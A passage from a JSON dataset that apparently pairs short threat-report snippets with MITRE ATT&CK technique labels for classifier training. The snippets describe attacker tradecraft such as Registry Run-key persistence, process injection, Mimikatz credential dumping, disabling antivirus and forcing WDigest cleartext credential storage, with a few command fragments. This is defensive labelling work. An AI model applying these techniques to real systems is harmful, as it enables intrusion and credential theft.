    "text": "infected WinCC machines via a hardcoded database server password.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has executed commands using `cmd.exe /c <command> > <%temp%>\\AM<random>. tmp 2>&1`. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses the cat /proc/cpuinfo | grep -c cpu family 2>&1 command to gather system information. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "WMI Consumers specify an\naction to be performed, including executing a command, running a\nscript, adding an entry to a log, or sending an email",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can connect to and disable the Symantec server on the victim's network.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Modules can be pushed to and executed by  that copy data to a staging area compress it and XOR encrypt it.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has added Registry Run key KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding to establish persistence.(Citation: FireEye MuddyWater Mar 2018)(Citation: Securelist MuddyWater Oct 2018)(Citation: Talos MuddyWater May 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: Trend Micro Muddy Water March 2021)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "adds a Registry Run key to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "attempt to obtain system information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The attackers collect information from the local system for exfiltration purposes.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for C2.(Citation: Proofpoint TA459 April 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "had downloaded additional tools to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "loader with rundll32",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can collect Microsoft Word documents from the target's file system as well as .txt .doc and .xls files from the Internet Explorer cache.(Citation: Eset Ramsay May 2020)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has communicated with the C2 server by sending POST requests over HTTP. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has checked for the presence of Arabic language in the infected machine's settings. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "adds a Registry Run key for ctfmon.exe to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has gathered operating system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "runs whoami on the victims machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "runs the whoami and query user commands.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can add Registry run keys for persistence.(Citation: Proofpoint Operation Transparent Tribe March 2016)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "using the API",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can identify the username on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "to discover interesting to them directories",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has modified the Registry key HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest by setting the UseLogonCredential registry value to 1 in order to force credentials to be stored in clear text in memory.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional scripts and files from adversary-controlled servers.(Citation: Proofpoint Leviathan Oct 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "malware can list a victim's logical drives and the type as well the total/free space of the fixed devices. Other malware can list a directory's contents.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has created Registry Run keys to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has created a directory named out in the user's %AppData% folder and copied files to it.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has used `cmd` to execute commands on a compromised host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors first used a compromised, highly privileged account to access the device where the Azure Active Directory (Azure AD) Connect agent is installed.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.(Citation: ESET Sednit USBStealer 2014)",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "creates a new Windows service with the malicious executable for persistence.(Citation: FinFisher Citation)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "collects user files from the compromised host based on predefined file extensions.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "They started by connecting to a new server via RDP",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can use GetCurrentProcessId for process discovery.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used  to establish full remote control of the connected machine and browse the victim file system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "s plugin deletes the collected files and log files after exfiltration.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can uninstall itself including deleting its executable.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "script that downloads a file from a fixed location and executes it.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not it will spawn a new instance.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Examining historical IP resolutions revealed a common IP between the active nameservers, 107.175.75[.]123",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can run  to harvest credentials.(Citation: Threatpost Lizar May 2021) ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "searches for files ending with dozens of different file extensions prior to encryption.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The IRC variant of MPK has a command set (Table 2) that makes this an effective backdoor Trojan, specifically allowing the actors to steal credentials from the targeted system via keylogging, to navigate and interact with the file system, to run arbitrary commands, and to download and execute additional tools on the system",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "is capable of using HTTP and HTTPS for C2.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Full Report)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It downloads and runs an executable payload",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to search for .txt .ppt .hwp .pdf and .doc files in specified directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can download payloads from adversary infrastructure.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can run a batch script named `del.bat` to remove any  payload-linked files from a compromise system if anti-analysis or locale checks fail.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used compromised credentials and/or session tokens to gain access into a victim's VPN VDI RDP and IAMs.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "opens cmd.exe on the victim.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "a Windows task XML to start",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "which can check running processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "executed using ShellExecute with the following command line:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "downloads an infostealer and starts it.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Some  versions have an embedded DLL known as MockDll that uses process hollowing and  to execute another payload.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can obtain information about process integrity levels.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "lured victims into clicking malicious files for machine reconnaissance and to execute malware.(Citation: Kaspersky Cloud Atlas December 2014)(Citation: Kaspersky Cloud Atlas August 2019)(Citation: Symantec Inception Framework March 2018)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "creates a Registry subkey that registers a new system device.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "sends the logged-on username to its hard-coded C2.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used `CreateToolhelp32Snapshot` `Process32First` and `Process32Next` API calls to enumerate the running processes in the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used process hollowing in iexplore.exe to load the  implant.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to drop additional files to an infected machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the OS version OS bit information and computer name.(Citation: Proofpoint TA505 October 2019)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used the `InterlockedExchange` `SeShutdownPrivilege` and `ExitWindowsEx` Windows API functions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Deletes existing file",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can collect information about the drives available on the system. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has executed the whoami command.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can retrieve information such as computer name OS version processor speed memory size and CPU speed.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has deleted malicious executables from compromised machines.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Parameter   Description    ‘u=’  This parameter contains target machine information in the following format: <Computer Name>, <User Name>, <Windows Versions>, <Processor Architecture>, <1.3>, < KdfrJKN >, <Volume Serial Number>    ‘&h=’  This parameter includes the information about the command executed and its results",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has collected the system architecture OS version and MAC address information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can gather the IP address from the victim's machine using the IP config command. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "deletes files using DeleteFileW API call.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "It proceeds by downloading the “sqlite3.dll” file",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "downloads an executable and injects it directly into a new process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "it can create a service",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Then, they are using the process hollowing technique to hide the execution of these tools inside of the original Microsoft vbc.exe (VisualBasic Compiler) process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can identify processes associated with analytical tools.(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "malware gathers the victim's local IP address MAC address and external IP address.(Citation: Unit 42 Magic Hound Feb 2017)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "When the user double clicks or opens the lnk file,",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used `rundll32.exe` to execute malicious installers.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "the shellcode is stored in files instead of the registry, and the stored shellcode is loaded and executed on Dolphin’s startup",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect CPU and architecture information from the victims machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The team attempted to leverage these credentials",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "the file to be downloaded.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe` to execute commands on a victim's system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "In some instances, they used Windows Management Instrumentation (WMI) Event Subscriptions",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can use the FindNextUrlCacheEntryA and FindFirstUrlCacheEntryA functions to search for specific strings within browser history.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "gathers credentials using  and Procdump. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "creates a scheduled task to run itself every three minutes.(Citation: Unit 42 OopsIE! Feb 2018)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "creates a batch script that,",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used tools including  to test internet connectivity from compromised hosts.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has a command to get the public IP address from a system. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "via the API CreateFileTransactedA()",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The directory creation.  Downloading the Payloads The remote XSL script downloads twelve files from the C2 server that masquerade themselves as JPEG, GIF, and extensionless files",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collects the victims username and whether that user is an admin.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Get processor information of the compromised host by executing \"SELECT * FROM Win32_Processor\"",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "cyber actors have been observed importing tools from GitHub or infected domains to victim networks",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can schedule tasks via the Windows COM API to maintain persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute or update malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the computer name and Windows version of an infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can search files on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Other functionalities provided by this section of the PowerShell Script are as follows:  Retrieves the following data from the system by leveraging Windows Management Instrumentation (WMI) queries and environment variables: IP Address from Network Adapter Configuration OS Name OS Architecture Computer Name Computer Domain Name Username    All of this data is concatenated and formatted as shown in Figure 13:    Figure 13: Concatenated and formatted data retrieved by PowerShell script  Register the victim’s machine to the C2 server by sending the REGISTER command to the server",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has performed credential dumping with  and procdump64.exe.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has queried Registry keys using reg query \\\\<host>\\HKU\\<SID>\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers and reg query \\\\<host>\\HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has called CreateToolhelp32Snapshot to enumerate all running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "network configuration",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can disarm Windows Defender during the UAC process to evade detection.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has exfiltrated files stolen from local systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "taskrun. Path and filename of the task to be run",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "To establish persistent remote access on the victim device, the threat actor abused Windows services to install modified version of Cobalt Strike payload",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can search for files on the infected machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "drops and executes Cobalt Strike in the memory space of “rundll32.exe.”",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "These batch scripts’ purposes",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This is attack vector presents interesting problems, as blocking or restricting the use of WMIC may not be a feasible solution for some administrators",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Most  samples maintain persistence by setting the Registry Run key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ in the HKLM or HKCU hive with the Registry value and file name varying by sample.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "contains a cleanup module that removes traces of itself from the victim.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to collect the hostname and OS information from an infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "One persistence mechanism used by  is to register itself as a Windows service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors discovered the local network configuration with `ipconfig`.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used various forms of spearphishing attempting to get a user to open attachments including but not limited to malicious Microsoft Word documents .pdf and .lnk files. (Citation: F-Secure The Dukes) (Citation: FireEye APT29 Nov 2018)(Citation: ESET Dukes October 2019)(Citation: ESET T3 Threat Report 2021)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Inject and execute DLLs",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can upload files from the C2 server to the victim machine using the upload command.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the victim hostname Windows version RAM amount number of drives and screen resolution.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has a function to kill processes associated with defenses and can prevent certain processes from launching.(Citation: Medium Metamorfo Apr 2020) ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can spawn a command shell and execute native commands.(Citation: MSTIC NOBELIUM Mar 2021)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "they accessed the server via RDP",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries can direct  to execute from the command line on infected hosts or have  create a reverse shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can write encrypted JSON configuration files to the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can send commands to C2 in the body of HTTP POST requests.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "gathers information about network adapters.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has checked the language of the infected system using the GetUSerDefaultUILanguage function.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used a script to check for the presence of files created by OpenSSH backdoors.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has disabled anti-virus and anti-spyware tools in some instances on the victims machines. The actors have also disabled proxy settings to allow direct communication from victims to the Internet.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate disk volumes get disk information and query service status.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "It checks running processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download malicious executables to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used tools with the ability to search for files on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can collect the owner and organization information from the target workstation. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can collect data from the system and can monitor changes in specified directories.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can gather a list of logged on users. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can collect files passwords and other data from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can contact actor-controlled C2 servers by using the Telegram API over HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can identify the user id on a target machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "enumerates the victim operating system and computer name during the initial infection.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can inject into into running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use RDP to connect to victim's machines.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was observed process injecting into legitimate process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has probed victim machines with whoami and has collected the username from the machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "which were started via their interactive RDP session",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "chooses a service drops a DLL file and writes it to that serviceDLL Registry key.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Get-ProcessTokenPrivilege Privesc-PowerUp module can enumerate privileges for a given process.(Citation: GitHub PowerSploit May 2012)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has communicated with its C2 servers via HTTPS and HTTP POST requests.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example  makes their malware look like legitimate Microsoft Word documents .pdf and/or .lnk files. (Citation: Proofpoint TA505 Sep 2017)(Citation: Proofpoint TA505 June 2018)(Citation: Proofpoint TA505 Jan 2019)(Citation: Cybereason TA505 April 2019)(Citation: ProofPoint SettingContent-ms July 2018)(Citation: Proofpoint TA505 Mar 2018)(Citation: Trend Micro TA505 June 2019)(Citation: Proofpoint TA505 October 2019)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has collected data from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "it downloads the file from its command and control (C2) server,",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can query the Registry to determine if it has already been installed on the system.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can uninstall itself from compromised hosts as well create and modify directories delete move copy and rename files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "2001Path to the registry key for the PrintProcessor service",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can delete itself following the successful execution of a follow-on payload.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used batch files to initiate additional downloads of malicious files.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve files from compromised client machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "This links the previous samples with this unique username",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "another shellcode, XOR-decrypts an embedded PE file – the Dolphin backdoor – and loads and executes it using a custom PE loader.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "to download a next stage EXE payload using cURL",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can gather the disk volume information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The target would then, naturally, double click the other file in the Zip archive",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded tools to compromised hosts.(Citation: Symantec Chafer February 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can collect the OS version architecture and machine name to create a unique token for the infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI queries to retrieve data from compromised hosts.(Citation: FireEye MuddyWater Mar 2018)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the victim username and permissions.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "used the ps command to monitor the running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to set SELinux to permissive mode.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "CreateFile and WriteFile are used",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "discover commands using the Windows utilities systeminfo",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can list the current running processes on the system.(Citation: Talos ROKRAT)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used malware that adds cryptocurrency miners as a service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to delete files from a compromised host.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020) ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the help of ShellExecute API",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can collect the victim's operating system and computer name during the initial infection.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can monitor processes on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can collect the username from the compromised machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "threat actors use their beacon sessions to establish RDP access",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can use the Linux API `statvfs` to enumerate the current working directory.(Citation: NCSC Cyclops Blink February 2022)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It uses the win32api.GetDiskFreeSpaceEx() function",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "makes various native API calls.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can parse the available drives and directories to determine which files to encrypt. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has executed Windows commands by using `cmd` and running batch scripts.(Citation: Talos Kimsuky Nov 2021)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can use a Registry Run key to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "provides access to the Windows Registry which can be used to gather information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Register a new service",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "is capable of downloading additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor executed two actions to bypass Windows Defender",
    "command": "",
